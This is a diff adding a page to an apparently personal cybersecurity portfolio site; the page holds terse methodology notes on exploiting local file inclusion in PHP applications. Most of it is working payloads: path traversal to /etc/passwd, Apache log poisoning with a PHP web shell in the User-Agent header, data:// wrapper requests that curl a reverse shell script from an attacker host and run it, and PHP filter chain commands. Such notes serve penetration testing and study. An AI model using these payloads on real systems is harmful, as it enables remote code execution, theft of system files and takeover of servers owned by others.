@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="assets/css/method-styles.css">
+
+    <title>TITLE</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="#" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="#home" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="9a426f51-e2cd-4d16-afec-a4ca048bb9ed" class="page sans"><header><h1 class="page-title">LFI</h1></header><div class="page-body"><p id="920f1531-0c6e-49dd-8474-443c3c3f8f37" class="">
+</p><ul id="120d0b60-0b38-47ea-a1af-883a9d5172ac" class="bulleted-list"><li style="list-style-type:disc">try for /etc/passwd</li></ul><p id="0f8e15b5-2890-4239-9069-f403437765c0" class="">LFI Log poisioning</p><pre id="f05d10de-ee45-492b-bf35-c2e8a749b808" class="code"><code>Example in Burp Suite:
+GET /file.php?file=../../../../var/log/apache2/access.log&amp;cmd=cat+var/www/file
+#User agent
+User-Agent: &lt;?php echo &#x27;&lt;pre&gt;&#x27; . shell_exec($_GET[&#x27;cmd&#x27;]) . &#x27;&lt;/pre&gt;&#x27;;?&gt;
+...</code></pre><p id="9ca45e06-e00d-4f93-89ae-d63072c454f1" class="">
+</p><p id="1418a159-fad3-4b7d-8208-fe4f331998f4" class="">
+</p><ul id="c8f0c4a3-e357-496d-baa7-fb9f54e34712" class="bulleted-list"><li style="list-style-type:disc">../../../../../../etc/passwd%00 → Works for old versions of PHP</li></ul><ul id="bc60b37b-e41b-482a-bad3-2ff97295fa24" class="bulleted-list"><li style="list-style-type:disc">Payloadsallthethings php filters</li></ul><ul id="0db783f1-807c-4720-9602-9ed3cce733de" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File Inclusion/README.md</a></li></ul><pre id="4b6ed96b-4963-4fcf-a131-994ab3e6e56c" class="code"><code>http://IP/page.php?page=data:text/plain,&lt;?php](http://0.0.0.0/section.php?page=data:text/plain,%3C?php)&gt; echo shell_exec(&quot;curl [http://IP/reverseshell.sh](http://ip/reverseshell.sh) --output /tmp/reverseshell.sh&quot;);?&gt;
+
+http://IP/page.php?page=data:text/plain,&lt;?php](http://0.0.0.0/section.php?page=data:text/plain,%3C?php)&gt; echo shell_exec(&quot;bash /tmp/reverse.sh&quot;);?&gt;</code></pre><p id="cf04442c-6383-459d-976c-4843fe525dcf" class="">
+</p><p id="feb5257c-0963-45a3-b2d5-c3f4bab7586b" class="">
+</p><h2 id="809c3450-8c9b-4da6-9514-ddbf8335e835" class="">PHP Filters:</h2><ul id="264ccc53-05d1-4685-b0b9-a120ac1f3bc1" class="bulleted-list"><li style="list-style-type:disc">we can combine PHP filters to get a resource with all filters applied</li></ul><p id="13de79ac-3900-49f5-801e-eaaa33a901e1" class="">0.0.0.0/index.php?filter</p><p id="a646126f-8c0a-4e4c-925a-85cd5e98c017" class="">http://0.0.0.0/index.php?php://filter/convert.base64-encode/resource=file.php</p><pre id="cebc9a7b-9e68-4595-946f-b0a92a30dd05" class="code"><code>python php_filter_chain_generator.py --chain &#x27;A&#x27; | tail -n 1 | urlencode
+
+python php_filter_chain_generator.py --chain &#x27;&lt;?php phpinfo();?&gt;&#x27; | tail -n 1 | urlencode</code></pre><p id="d985fbb9-9c27-4315-af11-2d25a971fab9" class="">
+</p><p id="ab5ccbb3-54b8-427f-bba4-b46a6eef11db" class="">urlencode:</p><pre id="cf13995e-e804-4544-9000-ddfdef4f56ef" class="code"><code>import sys
+import urllib.parse
+ 
+unencoded = &#x27;&#x27;
+ 
+for line in sys.stdin:
+        unencoded += line
+ 
+print(urllib.parse.quote(unencoded.rstrip(&#x27;\n\r&#x27;), safe=&#x27;&#x27;), end=&#x27;&#x27;)</code></pre><p id="433d934b-d14c-49b8-a5bd-6ca0a13bfa47" class="">http://0.0.0.0/index.php?php://filter/convert.base64-encode/resource=file.php</p><p id="77c1eace-949b-4cc8-ba16-8a51095acbf3" class="">
+</p></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
